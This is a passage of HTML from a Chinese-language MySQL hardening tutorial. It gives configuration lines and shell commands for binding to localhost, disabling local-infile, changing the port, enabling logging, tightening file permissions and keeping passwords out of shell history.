18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# vi /etc/my.cnf\t                   [RHEL/CentOS]\t\r\n# vi /etc/mysql/my.conf                    [Debian/Ubuntu] \r\nOR\r\n# vi /etc/mysql/mysql.conf.d/mysqld.cnf    [Debian/Ubuntu]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a85a066907818-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a85a066907818-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a334a85a066907818-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a85a066907818-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a85a066907818-1\"><span class=\"crayon-p\"># vi /etc/my.cnf\t                   [RHEL/CentOS]\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a85a066907818-2\"><span class=\"crayon-p\"># vi /etc/mysql/my.conf                    [Debian/Ubuntu] </span></div><div class=\"crayon-line\" id=\"crayon-5a635a334a85a066907818-3\"><span class=\"crayon-st\">OR</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a85a066907818-4\"><span class=\"crayon-p\"># vi /etc/mysql/mysql.conf.d/mysqld.cnf    [Debian/Ubuntu]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 <code>[mysqld]</code> 部分中添加下面这一行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a85f963715987\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbind-address = 127.0.0.1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a85f963715987-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a85f963715987-1\"><span class=\"crayon-v\">bind</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">address</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">127.0.0.1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>3. 禁用 MySQL 的 LOCAL INFILE</h1>\n<p>作为安全性增强的一部分，您需要禁用 <strong>local_infile</strong>，使用下面的指令以防止在 <code>[mysqld]</code> 部分从 MySQL 中访问底层文件系统。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a863035286788\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocal-infile=0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a863035286788-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a863035286788-1\"><span class=\"crayon-v\">local</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">infile</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>4. 修改 MySQL 的默认端口</h1>\n<p>设置端口变量用于监听 TCP/IP 连接的 MySQL 端口号。默认端口号是 3306，但是您可以在 <strong>[mysqld] </strong>中修改它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a866539400252\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nPort=5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a866539400252-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a866539400252-1\"><span class=\"crayon-v\">Port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>5、启用 MySQL 日志</h1>\n<p>日志是了解服务运行过程中发生了什么的最好的方法之一，在受到任何攻击的时候都可以很容易的从日志里看到任何入侵相关的行为。可以通过将下边的变量添加到配置文件[mysqld]部分来开启mysql日志功能。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a86a927119672\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlog=/var/log/mysql.log</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a86a927119672-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a86a927119672-1\"><span class=\"crayon-v\">log</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">log</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h1>6、设置合适的 MySQL 文件的访问权限</h1>\n<p>确保你已经为所有的 mysql 服务文件和数据路径设置了合适的访问权限。文件 /etc/my.conf 只能由 root 用户修改，这样就可以阻止其他用户修改数据库服务的配置。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a86d541720325\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# chmod 644 /etc/my.cnf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a86d541720325-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a86d541720325-1\"><span class=\"crayon-p\"># chmod 644 /etc/my.cnf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h1>7、删除 MySQL shell 历史</h1>\n<p>你在 MySQL shell 中执行的所有的命令都会被 mysql 客户端保存到一个历史文件：~/.mysql_history。这样是很危险的，因为对于你创建过的任何用户账户，所有的在 shell 输入过的用户名和密码都会记录到历史文件里面。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a871692415691\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# cat /dev/null &gt; ~/.mysql_history</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a871692415691-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a871692415691-1\"><span class=\"crayon-p\"># cat /dev/null &gt; ~/.mysql_history</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h1>8. 不要在命令行中运行 MySQL 命令</h1>\n<p>正如你所知道的，你在终端上输入的所有命令都会被存储在一个历史文件中，具体取决于你正在使用的shell（例如 bash 的 shell 历史文件放在 <strong>~/.bash_history</strong>）。攻击者访问这个历史文件可以很容易地看到记录在那里的任何密码。</p>\n<p>非常不建议在命令行里面输入密码，如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a874117658824\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -ppassword_</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a874117658824-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a874117658824-1\"><span class=\"crayon-p\"># mysql -u root -ppassword_</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f505f9f9145e6e2ddd243ec3d3ebf9f5.png\"><br>\n<em>使用密码连接 MySQL</em></p>\n<p>当你查看命令行历史文件的最后的部分时，可以看到之前输入过的密码。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a877087704615\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# history</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a877087704615-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a877087704615-1\"><span class=\"crayon-p\"># history</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/ec120994b3b6eb87f569f32434861ce9.png\"><br>\n<em>查看命令行输入历史</em></p>\n<p>推荐连接 MySQL 的方式是</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a334a87b374279524\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mysql -u root -p\r\nEnter password:</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a334a87b374279524-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a334a87b374279524-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a334a87b374279524-1\"><span class=\"crayon-p\"># mysql -u root -p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a334a87b374279524-2\"><span class=\"crayon-i\">Enter</span> <span class=\"crayon-v\">password</span><span 